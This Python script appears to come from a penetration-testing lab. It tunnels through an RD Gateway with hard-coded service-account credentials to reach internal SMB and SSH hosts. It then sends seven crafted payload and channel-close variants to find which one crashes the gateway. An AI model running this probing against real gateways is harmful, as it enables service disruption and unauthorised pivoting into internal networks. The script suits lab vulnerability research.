#!/usr/bin/env python3
"""payloadfate — bisect the 0x800759d8 abort trigger by client payload shape.

Alive tonight: [DC,127.0.0.1]+negotiate, [DEAD,127.0.0.1]+negotiate, holds.
Dead in tap (22:08): [live,127.0.0.1] + 51-byte first segment, abort 14ms
after data; disconhandler RE points at WriteToClient failing on a channel
whose client half is gone (response in flight when channel closed).

Variants, all on ONE tunnel, sequential, lifecycle-correct:
  P1 [DC,127.0.0.1] + 51B zeros
  P2 [DC,127.0.0.1] + 1 byte
  P3 [DC,127.0.0.1] + negotiate split 51B now / rest +10ms
  P4 [DC,127.0.0.1] + negotiate, close WITHOUT reading response (resp
     in flight at close — the WriteToClient race)
  P5 [DC,127.0.0.1] + negotiate, read 1 packet, close immediately
     (response half-delivered)
  P6 [DEAD,127.0.0.1] + 51B zeros
  P7 [DC,127.0.0.1] + negotiate, client-RST emulation: just stop reading
     and hard-close channel mid-response
Probe create (SSH banner) between each variant; report first killer.
"""
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/kali/workspace/RDetour")
from rdetour import (RDGTunnel, RDGError, pkt, smb2_negotiate,  # noqa: E402
                     smb2_server_guid)

GW = "ecorp-rds.ecorp.local"
DEAD = "192.168.15.99"
DC = "192.168.15.40"
SSH = "192.168.15.152"

T0 = time.time()
NEG = smb2_negotiate()


def say(*a):
    print("%7.3f" % (time.time() - T0), *a, flush=True)


class TapTunnel(RDGTunnel):
    eof = False

    def _out_fill(self, n, timeout=10):
        try:
            super()._out_fill(n, timeout)
        except RDGError as e:
            if "EOF" in str(e):
                self.eof = True
            raise

    def send_packet(self, raw):
        say("  TX 0x%02x len=%d" % (int.from_bytes(raw[:2], "little"),
                                    len(raw)))
        return super().send_packet(raw)

    def recv_packet(self, timeout=15):
        p = super().recv_packet(timeout)
        if p is None:
            say("  RX - (eof=%s)" % self.eof)
        else:
            say("  RX 0x%02x len=%d body=%s" %
                (p[0], 8 + len(p[1]), p[1][:12].hex()))
        return p


def create_open(t, names, port, tag):
    try:
        t.open_channel(names, port)
        say("[%s] granted" % tag)
        return True
    except RDGError as e:
        say("[%s] CREATE FAIL %s eof=%s" % (tag, e, t.eof))
        return False


def probe(t, i):
    """SSH banner probe — returns True if tunnel usable."""
    tag = "probe%d" % i
    if t.closed or t.eof:
        say("[%s] tunnel already flagged dead" % tag)
        return False
    if not create_open(t, [SSH], 22, tag):
        return False
    t0 = time.monotonic()
    buf = b""
    while time.monotonic() - t0 < 6:
        d = t.read(timeout=2)
        if d is None:
            break
        buf += d
        if b"SSH" in buf[:8]:
            break
    ok = b"SSH" in buf[:8]
    say("[%s] banner %s" % (tag, "ok" if ok else repr(buf[:16])))
    try:
        t.close_channel()
    except RDGError as e:
        say("[%s] close fail %s" % (tag, e))
        return False
    return ok


def variant(name, fn):
    say("=== %s ===" % name)
    fn()


def v_p1(t):
    if create_open(t, [DC, "127.0.0.1"], 445, "P1"):
        t.write(b"\x00" * 51)
        time.sleep(2)
        t.close_channel()


def v_p2(t):
    if create_open(t, [DC, "127.0.0.1"], 445, "P2"):
        t.write(b"\x41")
        time.sleep(2)
        t.close_channel()


def v_p3(t):
    if create_open(t, [DC, "127.0.0.1"], 445, "P3"):
        t.write(NEG[:51])
        time.sleep(0.01)
        t.write(NEG[51:])
        buf = b""
        t0 = time.monotonic()
        while len(buf) < 92 and time.monotonic() - t0 < 4:
            d = t.read(timeout=1)
            if d:
                buf += d
        t.close_channel()


def v_p4(t):
    """negotiate then IMMEDIATE close — response in flight at close."""
    if create_open(t, [DC, "127.0.0.1"], 445, "P4"):
        t.write(NEG)
        t.close_channel()


def v_p5(t):
    """negotiate, read FIRST packet of response, close at once."""
    if create_open(t, [DC, "127.0.0.1"], 445, "P5"):
        t.write(NEG)
        t.recv_packet(timeout=5)     # grab the 0x0a response packet raw
        t.close_channel()


def v_p6(t):
    if create_open(t, [DEAD, "127.0.0.1"], 445, "P6"):
        t.write(b"\x00" * 51)
        time.sleep(2)
        t.close_channel()


def v_p7(t):
    """negotiate, wait for response START, hard-close mid-delivery."""
    if create_open(t, [DC, "127.0.0.1"], 445, "P7"):
        t.write(NEG)
        d = t.read(timeout=5)        # first data slice
        say("[P7] got %d bytes, hard-closing now" % len(d or b""))
        t.close_channel()


VARIANTS = [("P1-51B-zeros", v_p1), ("P2-1B", v_p2), ("P3-split", v_p3),
            ("P4-close-blind", v_p4), ("P5-close-after-first", v_p5),
            ("P6-dead-51B", v_p6), ("P7-close-mid", v_p7)]


def main():
    socket.setdefaulttimeout(20)
    t = TapTunnel(GW, user="svcaccount", password="svcaccount",
                  domain="ECORP.local", verbose=False, connect_timeout=10)
    t.establish(auth_timeout=8)
    for i, (name, fn) in enumerate(VARIANTS):
        variant(name, lambda fn=fn: fn(t))
        ok = probe(t, i)
        say(">>> after %s: tunnel %s" % (name, "OK" if ok else "DEAD"))
        if not ok:
            say("KILLER = %s" % name)
            t.close()
            return
        time.sleep(1)
    say("ALL VARIANTS SURVIVED — killer is elsewhere")
    t.close()


if __name__ == "__main__":
    main()
